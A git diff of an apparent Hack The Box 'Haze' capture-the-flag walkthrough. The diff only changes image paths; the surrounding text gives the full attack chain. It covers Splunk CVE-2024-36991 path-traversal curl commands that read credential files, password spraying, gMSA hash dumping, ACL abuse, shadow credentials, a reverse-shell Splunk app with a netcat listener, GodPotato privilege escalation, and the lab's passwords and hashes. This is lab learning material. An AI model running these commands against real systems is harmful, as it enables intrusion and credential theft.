@@ -12,9 +12,9 @@ haze.htb**
 **RUN: sudo nmap -Pn -p- \--min-rate 5000 \--max-rate 10000 -T4 -sC -sV
 -oN nmap-aggressive.txt haze.htb**
 
-![](images/media/image1.png)
+![](Haze/media/image1.png)
 
-![](images/media/image2.png)
+![](Haze/media/image2.png)
 
 **Found: Host: DC01 and SERVICE: Splunk**
 
@@ -28,18 +28,18 @@ NEXT: Tried **http** and **https** on all SPLUNK PORTS
 
 - <http://haze.htb:8000> opened a SPLUNK WEBSITE with LOGIN FIELD
 
-![](images/media/image3.png)
+![](Haze/media/image3.png)
 
 - <https://haze.htb:8089> opened a WEBSITE with SPLUNK version!
 
-![](images/media/image4.png)
+![](Haze/media/image4.png)
 
 **5.** INFO: Googled for SPLUNK POC. FOUND:
 <https://github.com/bigb0x/CVE-2024-36991>
 
 \- Downloaded FILE **CVE-2024-36991.py**
 
-![](images/media/image5.png)
+![](Haze/media/image5.png)
 
 **6.** INFO: Found Users with PASSWORD HASHES
 
@@ -52,14 +52,14 @@ attempting to read a sensitive system file.
 
 **RUN:** **python CVE-2024-36991.py -u <http://haze.htb:8000>**
 
-![](images/media/image6.png)
+![](Haze/media/image6.png)
 
 **ALTERNATIVE:**
 
 **RUN:** **curl -s
 http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd**
 
-![](images/media/image7.png)
+![](Haze/media/image7.png)
 
 The \$6\$ prefix specifically indicates that the password hash uses the
 **SHA-512** algorithm.
@@ -67,11 +67,11 @@ The \$6\$ prefix specifically indicates that the password hash uses the
 **7.** INFO:
 <https://www.sonicwall.com/blog/critical-splunk-vulnerability-cve-2024-36991-patch-now-to-prevent-arbitrary-file-reads>
 
-![](images/media/image8.png)
+![](Haze/media/image8.png)
 
 RESULT:
 
-![](images/media/image9.png)
+![](Haze/media/image9.png)
 
 Check SPLUNK Documentary. Default Installation Directory: C:\\Program
 Files\\Splunk
@@ -89,26 +89,26 @@ http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system
 **RUN: curl -s
 <http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/system/local/authentication.conf>**
 
-![](images/media/image10.png)
+![](Haze/media/image10.png)
 
 **https://docs.splunk.com/Documentation/Splunk/9.4.2/Installation/InstallonWindowsviathecommandline**
 
 **RUN in Kali VM: curl -s
 http://haze.htb:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret**
 
-![](images/media/image11.png)
+![](Haze/media/image11.png)
 
 **9.** INFO: Download splunksecrects.py
 <https://github.com/HurricaneLabs/splunksecrets.git>
 
-![](images/media/image12.png)
+![](Haze/media/image12.png)
 
 **10.** INFO: Splunksecrets-tool: Get password
 
 **-** 1st **create splunk_secret.txt** and **paste the found PASSWORD
 HASH from STEP 8** in it.
 
-![](images/media/image13.png)
+![](Haze/media/image13.png)
 
 **RUN:** **splunksecrets splunk-decrypt \--splunk-secret
 splunk_secret.txt \--ciphertext
@@ -116,7 +116,7 @@ splunk_secret.txt \--ciphertext
 
 **FOUND Paul's PASSWORD**
 
-![](images/media/image14.png)
+![](Haze/media/image14.png)
 
 **ERROR SOLUTION: If you cannot run the previous COMMAND, do
 next.**
@@ -140,7 +140,7 @@ splunk_secret.txt \--ciphertext
 
 **USER + PASSWORD is correct!**
 
-![](images/media/image15.png)
+![](Haze/media/image15.png)
 
 **///-User-Enumeration-/////////////////////////////////////////////////////////////////////////**
 
@@ -149,7 +149,7 @@ splunk_secret.txt \--ciphertext
 **RUN:** **crackmapexec smb haze.htb -u \"paul.taylor\" -p
 \"Ld@p_Auth_Sp1unk@2k24\" \--rid-brute \| grep SidTypeUser**
 
-![](images/media/image16.png)
+![](Haze/media/image16.png)
 
 **WinRM Login not possible with paul.taylor credentials!**
 
@@ -161,14 +161,14 @@ USER ACCOUNTS
 -Create a FILE usernames.txt and paste all found USERS from STEP 11 in
 it.
 
-![](images/media/image17.png)
+![](Haze/media/image17.png)
 
 **12.1** INFO: PASSWORD SPRAYING worked for USER mark.adams
 
 **RUN:** **crackmapexec smb haze.htb -u \"usernames.txt\" -p
 \"Ld@p_Auth_Sp1unk@2k24\"**
 
-![](images/media/image18.png)
+![](Haze/media/image18.png)
 
 **13.** INFO: Download JSON-files (in this case JSON-files are located in
 ZIP-file)
@@ -177,7 +177,7 @@ ZIP-file)
 \'Ld@p_Auth_Sp1unk@2k24\' -d haze.htb -dc dc01.haze.htb -ns 10.10.11.61
 -c all \--zip**
 
-![](images/media/image19.png)
+![](Haze/media/image19.png)
 
 **Error: Failed to get Kerberos TGT -\>** Fix Kerberos clock skew
 issue.
@@ -190,7 +190,7 @@ issue.
 \'Ld@p_Auth_Sp1unk@2k24\' -d haze.htb -dc dc01.haze.htb -ns 10.10.11.61
 -c all \--zip**
 
-![](images/media/image20.png)
+![](Haze/media/image20.png)
 
 **14.** INFO: Start
 
@@ -209,7 +209,7 @@ STEPS in CERTIFIED VM)
 
 FOUND: USER mark.adams is MEMBER of <GMSA_MANAGERS@HAZE.HTB>
 
-![](images/media/image21.png)
+![](Haze/media/image21.png)
 
 **Read GMSA Password**
 
@@ -225,7 +225,7 @@ https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py**
 
 **RESULT: mark.adams DOESN'T have PERMISSION**
 
-![](images/media/image22.png)
+![](Haze/media/image22.png)
 
 **Mark.adams belongs to ADMIN GROUP, so can add permission to himself!**
 
@@ -241,7 +241,7 @@ Ld@p_Auth_Sp1unk@2k24**
 **RUN loggedin on POWERSHELL:** **Get-ADServiceAccount -Identity
 Haze-IT-Backup\$ \| Select-Object Name, ObjectClass**
 
-![](images/media/image23.png)
+![](Haze/media/image23.png)
 
 **15.4** INFO: Who has permission to see his password, ONLY DOMAIN
 ADMINS!
@@ -254,7 +254,7 @@ account.**
 \"Haze-IT-Backup\$\" -Properties
 PrincipalsAllowedToRetrieveManagedPassword**
 
-![](images/media/image24.png)
+![](Haze/media/image24.png)
 
 **15.5** INFO: Mark.adams belongs to GMSA administrator group. Try to
 mod the READABLE USER
@@ -271,7 +271,7 @@ otherwise it will be switched back to DOMAIN ADMINS, see RESULT in STEP
 \"Haze-IT-Backup\$\" -Properties
 PrincipalsAllowedToRetrieveManagedPassword**
 
-![](images/media/image25.png)
+![](Haze/media/image25.png)
 
 **15.6** INFO: Try reading Password, see STEP 15.2
 
@@ -281,7 +281,7 @@ out**
 **RUN:** **python gMSADumper.py -u \'mark.adams\' -p
 \'Ld@p_Auth_Sp1unk@2k24\' -d haze.htb**
 
-![](images/media/image26.png)
+![](Haze/media/image26.png)
 
 **Even though I got the hash value, I couldn\'t connect to port 5985**
 
@@ -292,7 +292,7 @@ This views ACL ACCESS CONTROL LIST of Backup
 **RUN loggedin with POWERSHELL:** **dsacls
 \"CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB\"**
 
-![](images/media/image27.png)
+![](Haze/media/image27.png)
 
 **17.** INFO: Since mark.adams is in **GMSA_MANAGERS group**, this value
 can be modified to get the PASSWORD HASH of the BACKUP
@@ -308,7 +308,7 @@ INFO: Get JSON-files 2nd time
 \--hashes \':a70df6599d5eab1502b38f9c1c3fd828\' -d haze.htb -dc
 dc01.haze.htb -ns 10.10.11.61 -c all \--zip**
 
-![](images/media/image28.png)
+![](Haze/media/image28.png)
 
 - **Drag & Drop into Bloodhound GUI**
 
@@ -317,7 +317,7 @@ dc01.haze.htb -ns 10.10.11.61 -c all \--zip**
 1st Open Haze-IT-Backup account: Go to **OUTBOUND OBJECT CONTROL-\>
 First degree object control**
 
-![](images/media/image29.png)
+![](Haze/media/image29.png)
 
 You can see that the BACKUP user can change the owner of the SUPPORT
 group, and the
@@ -325,7 +325,7 @@ group, and the
 SUPPORT group can change EDWARD\'s password and carry out a Shadow
 Credential attack
 
-![](images/media/image30.png)
+![](Haze/media/image30.png)
 
 **19.1** INFO: Change OWNER to Haze-IT-Backup
 
@@ -333,7 +333,7 @@ Credential attack
 -u \"Haze-IT-Backup\$\" -p \": a70df6599d5eab1502b38f9c1c3fd828\" set
 owner SUPPORT_SERVICES Haze-IT-Backup\$**
 
-![](images/media/image31.png)
+![](Haze/media/image31.png)
 
 **19.2** INFO: **Add FULL PERMISSION to yourself**
 
@@ -347,7 +347,7 @@ owner SUPPORT_SERVICES Haze-IT-Backup\$**
 
 **IMPORTANT: If these ERROR appears**
 
-![](images/media/image32.png)
+![](Haze/media/image32.png)
 
 **RERUN STEPS 15.6, 15.7 & 19.1:**
 
@@ -362,19 +362,19 @@ owner SUPPORT_SERVICES Haze-IT-Backup\$**
 \"Haze-IT-Backup\$\" -Properties
 PrincipalsAllowedToRetrieveManagedPassword**
 
-![](images/media/image33.png)
+![](Haze/media/image33.png)
 
 **RUN: bloodyAD \--host \"10.10.11.61\" -d \"haze.htb\" -u
 \"Haze-IT-Backup\$\" -p \":a70df6599d5eab1502b38f9c1c3fd828\" set owner
 SUPPORT_SERVICES Haze-IT-Backup\$**
 
-![](images/media/image34.png)
+![](Haze/media/image34.png)
 
 **RESULT:**
 
 **DACL=Directonary Access Control List**
 
-![](images/media/image35.png)
+![](Haze/media/image35.png)
 
 **EXPLANATION:**
 
@@ -391,7 +391,7 @@ SUPPORT_SERVICES object.**
 \"Haze-IT-Backup\$\" -p \": a70df6599d5eab1502b38f9c1c3fd828\" add
 groupMember SUPPORT_SERVICES Haze-IT-Backup\$**
 
-![](images/media/image36.png)
+![](Haze/media/image36.png)
 
 **If that runs into an ERROR:**
 
@@ -422,7 +422,7 @@ password.**
 -H \' :a70df6599d5eab1502b38f9c1c3fd828\' \--target edward.martin
 \--action add**
 
-![](images/media/image37.png)
+![](Haze/media/image37.png)
 
 **21.** INFO: Use the generated certificate to REQUEST TGT
 
@@ -431,14 +431,14 @@ DOWNLOAD: <https://github.com/dirkjanm/PKINITtools>
 **RUN:** **python gettgtpkinit.py -cert-pfx ../OT5uCVNC.pfx -pfx-pass
 WhO0d2bAYwH7rqS2NBU8 haze.htb/edward.martin edward.ccache**
 
-![](images/media/image38.png)
+![](Haze/media/image38.png)
 
 **22.** INFO: Set ENVIRONMENT VARIABLES
 
 **RUN:** **export KRB5CCNAME=/home/kali/Desktop/Machines/Haze\\
 VM/edward.ccache**
 
-![](images/media/image39.png)
+![](Haze/media/image39.png)
 
 **23.** INFO: Request NTHash. **Take -key** from STEP 21
 
@@ -446,7 +446,7 @@ VM/edward.ccache**
 3711d3aaee32265a0dbd3863d4db379205b7ea2b9aa02e800e6430f5ff2e95a6
 haze.htb/edward.martin**
 
-![](images/media/image40.png)
+![](Haze/media/image40.png)
 
 **24.** INFO: Connect through POWERSHELL. **Take the NTHash** from STEP
 23
@@ -454,7 +454,7 @@ haze.htb/edward.martin**
 **RUN in Kali VM:** **evil-winrm -i 10.10.11.61 -u edward.martin -H
 09e0b3eeb2e7a6b0d419e9ff8f4d91af**
 
-![](images/media/image41.png)
+![](Haze/media/image41.png)
 
 **///\-\--PRIVILEGE
 ESCALATION\-\--////////////////////////////////////////////////////////////////**
@@ -470,7 +470,7 @@ couldn't be accessed before!
 
 **RUN in loggedin with POWERSHELL:** **dir**
 
-![](images/media/image42.png)
+![](Haze/media/image42.png)
 
 After downloading, it is the **backup source code** of the website,
 which is **different from the actual website content**.
@@ -483,15 +483,15 @@ splunk_backup_2024-08-06.zip
 
 **In Progress:**
 
-![](images/media/image43.png)
+![](Haze/media/image43.png)
 
 **Finished:**
 
-![](images/media/image44.png)
+![](Haze/media/image44.png)
 
 **RESULT:**
 
-![](images/media/image45.png)
+![](Haze/media/image45.png)
 
 **27.** INFO: After downloading, it is the backup source code of the
 website, which is different from the actual website content.
@@ -501,7 +501,7 @@ on **Splunk\'s** password format
 
 **RUN in Kali VM: grep -rI \'\\\$1\\\$\' .**
 
-![](images/media/image46.png)
+![](Haze/media/image46.png)
 
 **27.1** INFO: Then decrypt it with **splunksecrets**, note that
 the **secret** here is in the backup code.
@@ -519,7 +519,7 @@ the **secret** here is in the backup code.
 
 **ERROR - COULDN'T DECRYPT IT SUCCESSFULLY**
 
-![](images/media/image47.png)
+![](Haze/media/image47.png)
 
 **RESULT should be: Sp1unkadmin@2k24**
 
@@ -548,19 +548,19 @@ SYSTEM)**
 
 **- Create ALL folders and subfolders, like this:**
 
-![](images/media/image48.png)
+![](Haze/media/image48.png)
 
 Pack the folder **reverse_shell_splunk** to a **TAR-file\**
-![](images/media/image49.png)
+![](Haze/media/image49.png)
 
 **RUN in Kali VM: tar -cvzf reverse_shell_splunk.tgz
 reverse_shell_splunk**
 
-![](images/media/image50.png)
+![](Haze/media/image50.png)
 
 **RUN in Kali VM: mv reverse_shell_splunk.tgz reverse_shell_splunk.spl**
 
-![](images/media/image51.png)
+![](Haze/media/image51.png)
 
 **32.** INFO: Start NETCAT NC LISTENER
 
@@ -569,23 +569,23 @@ reverse_shell_splunk**
 **IMPORTANT: Press ENTER button to get the line =\> PS
 C:\\Windows\\system32\>**
 
-![](images/media/image52.png)
+![](Haze/media/image52.png)
 
 **33.** INFO: Upload **reverse_shell_splunk.spl** to WEBSITE
 
-![](images/media/image53.png)
+![](Haze/media/image53.png)
 
-![](images/media/image54.png)
+![](Haze/media/image54.png)
 
 **After pushing the BUTTON Upload, connection establishes instantly!**
 
 **Press ENTER BUTTON to get the PS line!**
 
-![](images/media/image52.png)
+![](Haze/media/image52.png)
 
 **WHOAMI**
 
-![](images/media/image55.png)
+![](Haze/media/image55.png)
 
 **34.** INFO: View Permission of current USER
 
@@ -593,7 +593,7 @@ C:\\Windows\\system32\>**
 
 **WHOAMI /all**
 
-![](images/media/image56.png)
+![](Haze/media/image56.png)
 
 **35.** INFO: Create Splunk BOUNCE SHELL
 
@@ -619,7 +619,7 @@ HOW TO use this group:
 
 **RUN loggedin with POWERSHELL: cd temp**
 
-![](images/media/image57.png)
+![](Haze/media/image57.png)
 
 - **RUN in Kali VM: python3 -m http.server 80 (This starts the HTTP
   SERVER)**
@@ -631,15 +631,15 @@ HOW TO use this group:
 
 **Server:**
 
-![](images/media/image58.png)
+![](Haze/media/image58.png)
 
 **Kali VM:**
 
-![](images/media/image59.png)
+![](Haze/media/image59.png)
 
 **RUN in POWERSHELL: .\\GodPotato-NET4.exe -cmd "cmd /c whoami"**
 
-![](images/media/image60.png)
+![](Haze/media/image60.png)
 
 **36.** INFO: Read is successful. Get ROOT.TXT. Additionally check:
 whoami /priv
@@ -647,4 +647,4 @@ whoami /priv
 **RUN in POWERSHELL: ./GodPotato-NET4.exe -cmd \'cmd /c type
 C:\\Users\\Administrator\\Desktop\\root.txt\'**
 
-![](images/media/image61.png)
+![](Haze/media/image61.png)
